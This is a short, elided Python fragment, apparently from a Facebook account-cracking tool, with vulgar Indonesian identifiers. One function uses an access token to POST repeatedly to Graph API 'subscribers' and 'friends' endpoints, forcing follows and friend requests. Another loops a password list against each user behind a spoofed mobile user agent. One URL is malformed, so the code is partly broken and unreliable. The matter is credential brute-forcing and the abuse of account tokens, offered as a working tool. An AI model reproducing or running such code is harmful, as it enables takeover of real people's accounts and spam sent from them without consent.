...
def wuhan(kontol):
    try:
        ...
        requests.post('https://graph./subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        ...
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
            	...
            	_kontol = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
